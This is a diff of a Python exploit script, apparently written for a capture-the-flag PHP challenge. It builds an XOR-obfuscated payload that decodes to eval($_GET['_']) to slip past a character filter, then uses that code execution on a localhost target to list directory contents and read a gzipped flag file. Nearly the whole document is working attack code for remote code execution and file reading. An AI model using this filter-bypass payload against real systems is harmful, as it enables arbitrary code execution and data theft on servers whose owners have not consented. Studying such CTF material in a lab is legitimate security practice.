@@ -1,8 +1,8 @@
-import string,requests,math
+import string,requests
 
 def create_payload(strings=b""):
     all_key = b"&|\[]\"#$%\'()*+,-./:;<=>?^_{}`"
-    all_key = b"!\"#$%&\'()*+,-./:;<=>?@[\]^_{|}`"
+    # all_key = b"!\"#$%&\'()*+,-./:;<=>?@[\]^_{|}`"
     gets = ""
     keys = ""
     result = {}
@@ -29,13 +29,20 @@ def create_payload(strings=b""):
         
     return ".".join(payloads).replace("\\","\\\\")
 
+def read_flag(url):
+    payload_get = "?_= echo gzread(gzopen('z1n1_flagnya_om_slashr00t_5.txt','r'),1024);"
+    payload_post = create_payload(b"eva") + ".((',')^('}'^'='))" + ".'('.('{'^'_').('`'^'?').('`'^'\\'').('`'^'%').('}'^')').('`'^';')." + "'\\'_\\''" + ".('`'^'=').')'" # -> eval($_GET['_'].';')
+    return requests.post(url+payload_get,data={"e":payload_post}).text
+def get_dir_list(url):
+    payload_get = "?_=$it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator('.'));$it->rewind();print_r(iterator_to_array($it));"
+    payload_post = create_payload(b"eva") + ".((',')^('}'^'='))" + ".'('.('{'^'_').('`'^'?').('`'^'\\'').('`'^'%').('}'^')').('`'^';')." + "'\\'_\\''" + ".('`'^'=').')'" # -> eval($_GET['_'].';')
+    return requests.post(url+payload_get,data={"e":payload_post}).text
 
 # list dir
-url = "http://localhost/cmd.php?_=$it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator('.'));$it->rewind();print_r(iterator_to_array($it));"
+# url = "http://localhost:6074/slashroot/cmd.php?_=$it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator('.'));$it->rewind();print_r(iterator_to_array($it));"
 
 # read file
-url = "http://localhost:6074/slashroot/cmd.php?_=print_r(file('./z1n1_flagnya_om.txt'));"
+# url = "http://localhost:6074/slashroot/soal_fix/index.php?_= echo gzread(gzopen('z1n1_flagnya_om_slashr00t_5.txt','r'),1024);"
 
-payload = create_payload(b"eva") + ".((',')^('}'^'='))" + ".'('.('{'^'_').('`'^'?').('`'^'\\'').('`'^'%').('}'^')').('`'^';')." + "'\\'_\\''" + ".('`'^'=').')'" # -> eval($_GET['_'].';')
-a = requests.post(url,data={"cmd": payload}).text
-print(a)
+print(get_dir_list("http://localhost:6074/slashroot/soal_fix/index.php"))
+print(read_flag("http://localhost:6074/slashroot/soal_fix/index.php"))
